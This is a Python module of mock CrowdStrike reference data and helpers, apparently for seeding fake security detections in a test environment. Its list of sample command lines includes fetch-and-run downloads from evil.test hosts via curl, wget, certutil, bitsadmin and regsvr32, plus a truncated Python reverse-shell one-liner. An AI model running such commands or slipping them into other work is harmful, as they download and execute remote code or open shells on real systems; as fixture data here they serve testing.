"""CrowdStrike-specific reference data and helper functions.

Constants and pure helpers shared across all CS domain seeders.
No repository imports — this module must remain free of side effects.
"""
from __future__ import annotations

import random

CS_CID: str = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"
"""Mock customer ID (32-char hex)."""

CS_DETECTION_SCENARIOS: list[str] = [
    "known_malware", "sensor_based_ml", "cloud_based_ml",
    "intelligence_based", "custom_ioc", "behavior_based",
    "suspicious_activity", "adware_pup",
]

CS_DETECTION_TACTICS: list[str] = [
    "Execution", "Persistence", "PrivilegeEscalation",
    "DefenseEvasion", "CredentialAccess", "Discovery",
    "LateralMovement", "Collection", "Exfiltration",
    "CommandAndControl", "Impact", "InitialAccess",
]

CS_DETECTION_TECHNIQUES: list[str] = [
    "T1059.001", "T1547.001", "T1055", "T1003.001",
    "T1071.001", "T1486", "T1566.001", "T1021.001",
    "T1112", "T1057", "T1082", "T1083",
]

CS_SEVERITY_NAMES: dict[range, str] = {
    range(0, 20): "Informational",
    range(20, 40): "Low",
    range(40, 60): "Medium",
    range(60, 80): "High",
    range(80, 101): "Critical",
}

CS_IOC_TYPES: list[str] = ["sha256", "md5", "domain", "ipv4", "ipv6"]
CS_IOC_ACTIONS: list[str] = ["detect", "prevent", "prevent_no_ui", "no_action", "allow"]
CS_IOC_SEVERITIES: list[str] = ["informational", "low", "medium", "high", "critical"]

CS_INCIDENT_NAMES: list[str] = [
    "Ransomware Activity Detected",
    "Credential Theft Attempt",
    "Lateral Movement via RDP",
    "Suspicious PowerShell Execution",
    "Known Malware: Emotet Variant",
    "Supply Chain Compromise Indicator",
    "C2 Communication Detected",
    "Privilege Escalation Attempt",
    "Data Exfiltration via DNS",
    "Insider Threat: Mass File Access",
]

CS_BEHAVIOR_FILENAMES: list[str] = [
    "powershell.exe", "cmd.exe", "rundll32.exe", "regsvr32.exe",
    "mshta.exe", "wscript.exe", "cscript.exe", "certutil.exe",
    "bitsadmin.exe", "svchost.exe", "conhost.exe", "explorer.exe",
    "bash", "python3", "curl", "wget",
]

CS_BEHAVIOR_CMDLINES: list[str] = [
    "powershell.exe -enc SQBFAFgA...",
    "cmd.exe /c whoami && net user",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
    "certutil -urlcache -split -f http://evil.test/payload.exe",
    "bitsadmin /transfer job /download http://evil.test/mal.exe",
    "regsvr32 /s /n /u /i:http://evil.test/file.sct scrobj.dll",
    "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run\")",
    "python3 -c 'import socket,subprocess,os;s=socket.socket(...)'",
    "curl -s http://c2.evil.test/beacon | bash",
    "wget -qO- http://c2.evil.test/stage2 | sh",
]


def cs_hex_id(length: int = 32) -> str:
    """Generate a deterministic hex string using the seeded RNG.

    Args:
        length: Number of hex characters to produce.

    Returns:
        Lowercase hex string of the requested length.
    """
    return "".join(f"{random.randint(0, 255):02x}" for _ in range(length // 2))


def severity_display(score: int) -> str:
    """Map a 0-100 severity score to its display name.

    Args:
        score: Integer severity score between 0 and 100.

    Returns:
        Human-readable severity label.
    """
    for r, name in CS_SEVERITY_NAMES.items():
        if score in r:
            return name
    return "Informational"
